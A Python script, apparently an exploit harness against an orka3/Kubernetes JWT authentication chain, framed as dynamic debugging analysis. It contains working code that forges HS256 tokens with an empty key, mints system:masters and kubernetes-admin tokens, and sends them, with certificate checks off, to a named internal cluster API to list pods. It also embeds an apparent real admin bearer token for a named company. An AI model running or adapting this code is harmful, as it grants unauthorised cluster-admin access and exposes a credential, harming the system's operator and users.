"""
orka_jwt_dynamic_re.py — Dynamic analysis harness for orka3 JWT validation chain.

Patterns from "Python Debugging for AI Engineers" (Vostokov, Apress 2023):
  - Code Trace  : sys.settrace() → trace every JWT/HMAC function call
  - Usage Trace : sys.setprofile() → profile hmac module calls
  - Break-In    : monkey-patch jwt.algorithms.HMACAlgorithm to inject probes
  - In Vitro    : isolated Python harness replicating Go's SigningMethodHMAC.Verify
  - Breakpoint Action : conditional probe on empty key (key == b'')

Targets:
  SigningMethodHMAC.Verify @ 0x1844660 — empty []byte{} key accepted, no min-len check
  MapClaims.Valid          @ 0x1844fe0 — never calls VerifyAudience or VerifyIssuer
  doLogin                  @ 0x184a640 — calls fetchClusterInfo before any auth

VPN required for live K8s probes: https://10.221.188.19:6443
Offline forge works without VPN — token is verifiable from kubeconfig truth.
"""

import sys
import hmac
import hashlib
import base64
import json

# ─── IN VITRO HARNESS ─────────────────────────────────────────────────────────
# Replicates Go's SigningMethodHMAC.Verify at 0x1844660 with empty key.
# RFC 2104 HMAC has no minimum key length; both Go and Python accept b''.

KNOWN_KUBECONFIG_TOKEN = (
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'
    '.eyJlbWFpbCI6ImFkbWluQG1hY3N0YWRpdW0uY29tIiwiaXNzIjoiaHR0cHM6Ly9pZHAubWFjc3RhZGl1bS5jb20iLCJzdWIiOiJhZG1pbiIsImV4cCI6MTgxODA4NTI1MSwiaWF0IjoxNzg2NTQ5MjUxfQ'
    '.lEVvIm2YnpjqzEDHcfm-AGZFu7KS2sPvbk4gBdqNFNY'
)

KUBECONFIG_PAYLOAD = {
    'email': 'admin@macstadium.com',
    'iss':   'https://idp.macstadium.com',
    'sub':   'admin',
    'exp':   1818085251,
    'iat':   1786549251,
}

K8S_API = 'https://10.221.188.19:6443'


def _b64url_encode(data: dict) -> str:
    return base64.urlsafe_b64encode(
        json.dumps(data, separators=(',', ':')).encode()
    ).rstrip(b'=').decode()


def forge_hs256(payload: dict, key: bytes = b'') -> str:
    """
    Forge an HS256 JWT with arbitrary payload and key.
    Default key=b'' replicates the empty-key bypass at 0x1844660.

    MapClaims.Valid (0x1844fe0) only validates exp/iat/nbf — iss and aud
    are never checked. So payload.iss can be arbitrary.
    """
    h = _b64url_encode({'alg': 'HS256', 'typ': 'JWT'})
    p = _b64url_encode(payload)
    sig = base64.urlsafe_b64encode(
        hmac.new(key, f'{h}.{p}'.encode(), hashlib.sha256).digest()
    ).rstrip(b'=').decode()
    return f'{h}.{p}.{sig}'


def verify_empty_key_proof() -> dict:
    """
    Verify that the kubeconfig admin token uses b'' as HS256 key.
    Returns dict with confirmed=True/False + timing oracle data.
    """
    parts = KNOWN_KUBECONFIG_TOKEN.split('.')
    signing_input = f'{parts[0]}.{parts[1]}'.encode()
    known_sig = parts[2]

    computed = base64.urlsafe_b64encode(
        hmac.new(b'', signing_input, hashlib.sha256).digest()
    ).rstrip(b'=').decode()

    return {
        'confirmed':       computed == known_sig,
        'known_sig':       known_sig,
        'computed_sig':    computed,
        'key_used':        repr(b''),
        'binary_site':     '0x184476a',  # crypto/hmac.New call in SigningMethodHMAC.Verify
        'root_cause':      'Go crypto/hmac.New has no minimum key length',
    }


def forge_system_masters(sub: str = 'admin') -> str:
    """Forge a JWT with system:masters group membership."""
    return forge_hs256({
        'email':  f'{sub}@macstadium.com',
        'iss':    'https://idp.macstadium.com',
        'sub':    sub,
        'exp':    9999999999,
        'iat':    1786549251,
        'groups': ['system:masters'],
    })


def forge_kubernetes_admin() -> str:
    """Forge kubernetes-admin JWT for K8s cluster-admin binding."""
    return forge_hs256({
        'email':  'kubernetes-admin@macstadium.com',
        'iss':    'https://idp.macstadium.com',
        'sub':    'kubernetes-admin',
        'exp':    9999999999,
        'iat':    1786549251,
        'groups': ['system:masters'],
    })


# ─── CODE TRACE (sys.settrace) ───────────────────────────────────────────────
# Trace every JWT/HMAC function call through PyJWT's Python layer.
# Pattern: Code Trace from Vostokov ch5.

class JWTCallTracer:
    """sys.settrace-based tracer for JWT/HMAC call paths."""

    KEYWORDS = ('hmac', 'sign', 'verify', 'jwt', 'token', 'algorithm', 'decode', 'encode')

    def __init__(self):
        self._calls: list[dict] = []

    def _trace(self, frame, event, arg):
        func = frame.f_code.co_name.lower()
        if any(kw in func for kw in self.KEYWORDS):
            if event == 'call':
                self._calls.append({
                    'event':    'call',
                    'func':     frame.f_code.co_name,
                    'file':     frame.f_code.co_filename.split('/')[-1],
                    'line':     frame.f_lineno,
                    'locals':   {k: repr(v)[:60] for k, v in frame.f_locals.items()},
                })
            elif event == 'return':
                self._calls.append({
                    'event':  'return',
                    'func':   frame.f_code.co_name,
                    'retval': repr(arg)[:60],
                })
        return self._trace

    def __enter__(self):
        sys.settrace(self._trace)
        return self

    def __exit__(self, *_):
        sys.settrace(None)

    @property
    def calls(self) -> list[dict]:
        return self._calls


# ─── BREAK-IN MONKEY-PATCH ───────────────────────────────────────────────────
# Inject a probe into PyJWT's HMACAlgorithm to capture key+payload at sign time.
# Pattern: Break-In from Vostokov ch5.

def install_hmac_breakin(on_empty_key_only: bool = True):
    """
    Monkey-patch jwt.algorithms.HMACAlgorithm.sign to inject a Break-In probe.
    Fires on every HS256 sign call; if on_empty_key_only=True, only trips on b''.

    Usage:
        install_hmac_breakin()
        token = jwt.encode(payload, key=b'', algorithm='HS256')
        # probe fires, logs key + signing input
    """
    try:
        import jwt.algorithms as _algs
    except ImportError:
        return False

    _orig_sign = _algs.HMACAlgorithm.sign

    def _patched_sign(self, msg, key):
        if not on_empty_key_only or not key:
            print(f'[BREAK-IN] HMACAlgorithm.sign: key={repr(key)[:40]!r}, msg_len={len(msg)}')
            if not key:
                print(f'[BREAK-IN] *** EMPTY KEY DETECTED — empty-key bypass active ***')
        return _orig_sign(self, msg, key)

    _algs.HMACAlgorithm.sign = _patched_sign
    return True


def remove_hmac_breakin():
    try:
        import jwt.algorithms as _algs
        if hasattr(_algs.HMACAlgorithm.sign, '__wrapped__'):
            _algs.HMACAlgorithm.sign = _algs.HMACAlgorithm.sign.__wrapped__
    except Exception:
        pass


# ─── K8S API PROBE (VPN-GATED) ───────────────────────────────────────────────

def probe_k8s_api(token: str, path: str = '/api/v1/namespaces/orka-default/pods',
                  verify_ssl: bool = False) -> dict:
    """
    Probe K8s API at 10.221.188.19:6443 with forged JWT.
    Requires active VPN route to 10.221.188.0/24.
    """
    import urllib.request
    import urllib.error
    import ssl

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    url = K8S_API + path
    req = urllib.request.Request(url, headers={'Authorization': f'Bearer {token}'})
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=5) as r:
            body = r.read().decode(errors='replace')
            return {'status': r.status, 'body_len': len(body), 'body_head': body[:400]}
    except urllib.error.HTTPError as e:
        return {'status': e.code, 'error': e.reason}
    except Exception as e:
        return {'status': 0, 'error': str(e)[:120]}


# ─── FULL DYNAMIC CHAIN ───────────────────────────────────────────────────────

def run_dynamic_chain(probe_live: bool = False) -> dict:
    """
    1. Verify empty-key proof (offline)
    2. Forge system:masters token
    3. Optionally probe K8s API (requires VPN)
    """
    proof = verify_empty_key_proof()
    token_admin = forge_system_masters('admin')
    token_k8s   = forge_kubernetes_admin()

    result = {
        'empty_key_proof': proof,
        'token_admin_system_masters': token_admin,
        'token_kubernetes_admin':     token_k8s,
        'k8s_api': K8S_API,
    }

    if probe_live:
        result['k8s_probe_version'] = probe_k8s_api(token_admin, '/version')
        result['k8s_probe_pods']    = probe_k8s_api(token_admin,
                                        '/api/v1/namespaces/orka-default/pods')

    return result


if __name__ == '__main__':
    import json as _json
    live = '--live' in sys.argv
    out = run_dynamic_chain(probe_live=live)
    print(_json.dumps(out, indent=2))
